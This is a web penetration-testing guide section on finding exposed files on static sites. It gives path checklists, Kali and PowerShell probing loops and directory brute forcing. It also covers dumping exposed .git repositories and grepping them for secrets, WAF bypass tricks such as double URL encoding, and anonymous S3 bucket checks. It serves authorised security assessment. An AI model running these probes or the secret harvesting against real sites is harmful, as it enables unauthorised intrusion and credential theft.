# 1. Exposed Files & Information Disclosure

**What it is:** sensitive files left reachable on the webserver \u2014 version control, config, backups, logs, docs. Highest-value category on a static site since there's no login to break through first.

**Why it matters here:** static sites are often deployed by copying a build folder; leftover `.git`, `.env`, deploy scripts, or backup archives are extremely common.

### Test checklist
- [ ] `/.git/config`, `/.git/HEAD` \u2192 if 200, the whole repo history (incl. old secrets) may be pullable
- [ ] `/.svn/`, `/.hg/` (older VCS)
- [ ] `/.env`, `/.env.local`, `/.env.production`
- [ ] `/config.php.bak`, `/wp-config.php.bak`, `/web.config.bak`
- [ ] `/backup.zip`, `/site-backup.tar.gz`, `/db.sql`, `/dump.sql`
- [ ] `/.DS_Store` (leaks directory file listing on Mac-deployed sites)
- [ ] `/.well-known/security.txt`, `/.well-known/` directory
- [ ] `/README.md`, `/CHANGELOG.md`, `/package.json`, `/composer.json` (version fingerprinting \u2192 CVE lookup)
- [ ] `/sitemap.xml`, `/robots.txt` (Disallow entries reveal hidden paths)
- [ ] `/server-status`, `/server-info` (Apache debug endpoints)
- [ ] `/.htaccess`, `/web.config` directly fetchable
- [ ] Directory listing enabled (`Index of /` on any folder)
- [ ] Error pages leaking stack traces, file paths, DB connection strings (try malformed requests, 500 triggers)

### Linux (Kali)
```
# Manual spot checks
for p in .git/config .env config.php.bak backup.zip .DS_Store server-status; do
  code=$(curl -s -o /dev/null -w "%{http_code}" https://target.com/$p)
  echo "$p -> $code"
done

# Automated with a big wordlist
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -mc 200
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -x bak,zip,sql,env,git,old,swp

# If .git/ is exposed, dump the whole repo:
git-dumper https://target.com/.git/ ./dumped-repo
cd dumped-repo && git log --all && git log -p | grep -iE "password|secret|key"

# Directory listing scan
nikto -h https://target.com -Tuning 6
```

### Windows
```
$paths = ".git/config",".env","config.php.bak","backup.zip",".DS_Store","server-status"
foreach ($p in $paths) {
  try {
    $r = Invoke-WebRequest -Uri "https://target.com/$p" -UseBasicParsing -ErrorAction Stop
    "$p -> $($r.StatusCode)"
  } catch { "$p -> $($_.Exception.Response.StatusCode.value__)" }
}

# gobuster/ffuf binaries run natively on Windows (no WSL needed):
gobuster.exe dir -u https://target.com -w commonlist.txt -x bak,zip,sql,env,old
```

**Impact framing for report:** exposed `.git` or `.env` = critical (credential/source leak); exposed backups/logs = high; directory listing with no sensitive content = low/informational.

## Advanced / Bypass Techniques

### Getting past "not found" on obvious paths
A flat 404 on `/.git/config` doesn't mean it's absent \u2014 web servers/WAFs often block the *obvious* path, not the resource:
```
# Case variation (some servers/WAFs are case-sensitive on rules but not on the filesystem)
curl https://target.com/.GIT/config
curl https://target.com/.Git/Config

# Trailing dot / slash tricks (bypasses naive string-match rules)
curl https://target.com/.git/config.
curl https://target.com/.git//config
curl https://target.com/./.git/config

# Double URL encoding (bypasses WAFs that decode once then check)
curl "https://target.com/%2e%67%69%74/config"
curl "https://target.com/.git%2fconfig"       # %2f = /

# Null byte / old tech quirks (legacy PHP/IIS)
curl "https://target.com/.git/config%00.jpg"
```

### Recursive + extension-aware brute forcing (finds nested leftovers)
```
ffuf -u https://target.com/FUZZ -w raft-large-directories.txt -recursion -recursion-depth 2 -e .bak,.old,.zip,.tar.gz,.sql,.log
gobuster dir -u https://target.com -w big.txt -r               # -r follows redirects instead of treating them as "not found"
feroxbuster -u https://target.com -x bak,old,zip,sql --filter-status 404  # auto-recursive, faster at scale than gobuster
```

### S3 / cloud storage bucket hunting (very common on static sites, since they're often *hosted* in a bucket)
```
# Kali
s3scanner scan --bucket-file possible_buckets.txt
aws s3 ls s3://target-bucket-name --no-sign-request      # anonymous access check
curl https://target-bucket-name.s3.amazonaws.com/        # directory listing if misconfigured
# generate bucket name candidates from company name, domain, env naming conventions (target-prod, target-backup, target-static, target-assets)
```
```
# Windows \u2014 awscli works identically; s3scanner is Go, run natively
aws s3 ls s3://target-bucket-name --no-sign-request
```

### Wayback / archive.org for files that are no longer linked but may still resolve
```
curl -s "http://archive.org/wayback/available?url=target.com/backup.zip"
# if it was ever live, it often still resolves on the current server even though nothing links to it anymore
```

**Resources:** OWASP Testing Guide (Information Gathering chapter), PayloadsAllTheThings \u2014 Directory Traversal & File Disclosure sections, S3 bucket naming wordlists (SecLists `Discovery/Web-Content/`).
